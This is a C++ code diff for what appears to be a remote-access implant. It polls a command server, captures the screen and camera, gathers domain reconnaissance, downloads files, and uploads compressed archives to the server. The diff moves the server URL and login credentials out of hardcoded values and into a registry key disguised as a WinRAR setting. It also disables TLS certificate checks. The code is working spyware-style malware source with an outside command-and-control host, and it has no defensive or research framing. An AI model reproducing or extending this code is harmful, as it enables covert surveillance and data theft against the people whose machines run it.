@@ -11,6 +11,7 @@
 #include <unordered_map>
 #include <vector>
 #include <curl/curl.h>
+#include <wincrypt.h>
 #include "zlib.h"
 #include "ScreenCapture.h"
 #include "FileUtils.h" 
@@ -25,6 +26,74 @@ struct CommandInfo {
     std::string extra;
 };
 
+std::string toHex(const std::string& input) {
+    std::stringstream hexStream;
+    hexStream << std::hex << std::setfill('0');
+    for (unsigned char c : input) {
+        hexStream << std::setw(2) << static_cast<unsigned int>(c);
+    }
+    return hexStream.str();
+}
+
+std::string GetRegistryValue(HKEY hKey, const std::string& subKey, const std::string& valueName) {
+    HKEY hSubKey;
+    if (RegOpenKeyExA(hKey, subKey.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
+        DWORD dataSize = 0;
+        if (RegQueryValueExA(hSubKey, valueName.c_str(), nullptr, nullptr, nullptr, &dataSize) == ERROR_SUCCESS) {
+            std::vector<char> buffer(dataSize);
+            if (RegQueryValueExA(hSubKey, valueName.c_str(), nullptr, nullptr, reinterpret_cast<LPBYTE>(buffer.data()), &dataSize) == ERROR_SUCCESS) {
+                return std::string(buffer.data());
+            }
+        }
+        RegCloseKey(hSubKey);
+    }
+    return ""; // Retourne une chaîne vide si la valeur n'a pas été trouvée ou s'il y a eu une erreur.
+}
+
+std::string getExecutablePath() {
+    char buffer[MAX_PATH];
+    GetModuleFileNameA(NULL, buffer, MAX_PATH);
+    return std::string(buffer);
+}
+
+std::string calculateSHA256Hash(const std::string& filePath) {
+    std::string hashResult;
+    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (hFile != INVALID_HANDLE_VALUE) {
+        HCRYPTPROV hProv = 0;
+        HCRYPTHASH hHash = 0;
+        DWORD bytesRead = 0;
+        BYTE buffer[4096] = { 0 };
+        DWORD dwDataLen = sizeof(buffer);
+        DWORD dwHashLen = 0;
+        DWORD cbHashSize = 0;
+        DWORD cbBlockSize = 0;
+        DWORD dwCount = 0;
+
+        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_MACHINE_KEYSET);
+
+        if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+            while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0) {
+                CryptHashData(hHash, buffer, bytesRead, 0);
+            }
+
+            cbHashSize = sizeof(DWORD);
+            if (CryptGetHashParam(hHash, HP_HASHSIZE, (BYTE*)&dwHashLen, &cbHashSize, 0)) {
+                cbBlockSize = dwHashLen;
+                hashResult.resize(cbBlockSize);
+                CryptGetHashParam(hHash, HP_HASHVAL, (BYTE*)&hashResult[0], &dwHashLen, 0);
+            }
+
+            CryptDestroyHash(hHash);
+        }
+
+        CryptReleaseContext(hProv, 0);
+        CloseHandle(hFile);
+    }
+
+    return hashResult;
+}
 
 std::string getCurrentDateTime() {
     auto now = std::chrono::system_clock::now();
@@ -193,7 +262,7 @@ bool downloadFile(const std::string& url, const std::string& destinationPath) {
 
 std::unordered_map<std::string, std::string> executeAllCommands() {
     std::unordered_map<std::string, std::string> system_outputs;
-    bool onDomain = isDomainJoined();
+  bool onDomain = isDomainJoined();
     if (onDomain) {
         executeCommand("echo %USERDOMAIN%", system_outputs["USERDOMAIN"]);
         executeCommand("echo %USERDNSDOMAIN%", system_outputs["USERDNSDOMAIN"]);
@@ -365,12 +434,27 @@ void writeHtmlFile(const std::unordered_map<std::string, std::string>& system_ou
 
 
 int main() {
-    const char* loginUrl = "https://16.16.16.114:5000/login";
-    const char* commandsUrl = "https://16.16.16.114:5000/get_commands";
-    const char* uploadUrl = "https://16.16.16.114:5000/upload";
-    
+    std::string user;
+    std::string password;
+    std::string secret;
+    const std::string keyPath = "Software\\WinRAR\\hclient";
+    std::string Username = GetRegistryValue(HKEY_CURRENT_USER, keyPath, "user");
+    std::string Password = GetRegistryValue(HKEY_CURRENT_USER, keyPath, "password");
+    std::string Secret = GetRegistryValue(HKEY_CURRENT_USER, keyPath, "secret");
+    std::string URL = GetRegistryValue(HKEY_CURRENT_USER, keyPath, "url");   
+    std::string loginUrl = std::string(URL) + "/login";
+    std::string commandsUrl = std::string(URL) + "/get_commands";
+    std::string uploadUrl = std::string(URL) + "/upload";
     std::string cookies;
-
+    std::string executablePath = getExecutablePath();
+    std::string hash = calculateSHA256Hash(executablePath);
+    std::cout << "SHA-256 Hash of the executable: " << toHex(hash) << std::endl;
+  
+    std::cout << "User: " << Username << std::endl;
+    std::cout << "Password: " << Password << std::endl;
+    std::cout << "Secret: " << Secret << std::endl;
+    std::cout << "URL: " << URL << std::endl;
+    
     while (true) {
         CURL* curl = curl_easy_init();
         if (!curl) {
@@ -411,7 +495,7 @@ int main() {
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
         curl_easy_setopt(curl, CURLOPT_URL, loginUrl);
         curl_easy_setopt(curl, CURLOPT_REFERER, loginUrl);
-        std::string postFields = "username=client&password=client&secret=client&csrf_token=" + csrfToken;
+        std::string postFields = "username=" + Username + "&password=" + Password + "&secret=" + Secret + "&csrf_token=" + csrfToken;
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
         curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
         res = curl_easy_perform(curl);
@@ -459,8 +543,10 @@ int main() {
 
 
             std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;
+            
+            performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken);
 
-            performFileUpload(curl, uploadUrl, commandsUrl, compressedArchivePath.c_str(), commandInfo, csrfToken);
+
             
         } else if (commandInfo.command == "get_camera") {
             std::cout << "Extracted Command: " << commandInfo.command << std::endl;
@@ -478,7 +564,8 @@ int main() {
 
             std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;
 
-            performFileUpload(curl, uploadUrl, commandsUrl, compressedArchivePath.c_str(), commandInfo, csrfToken);
+            performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken);
+
         
         } else if (commandInfo.command == "get_recon_info") {
             std::cout << "Extracted Command: " << commandInfo.command << std::endl;
@@ -493,7 +580,8 @@ int main() {
 
             std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;
 
-            performFileUpload(curl, uploadUrl, commandsUrl, compressedArchivePath.c_str(), commandInfo, csrfToken);
+            performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken);
+
 
         } else if (commandInfo.command == "download_file") {
             std::cout << "Extracted Command: " << commandInfo.command << std::endl;
@@ -530,7 +618,10 @@ int main() {
      
             if (std::filesystem::exists(compressedArchivePath)) {
 
-                performFileUpload(curl, uploadUrl, commandsUrl, compressedArchivePath.c_str(), commandInfo, csrfToken);
+                performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken);
+
+
+
             } else {
 
             }           
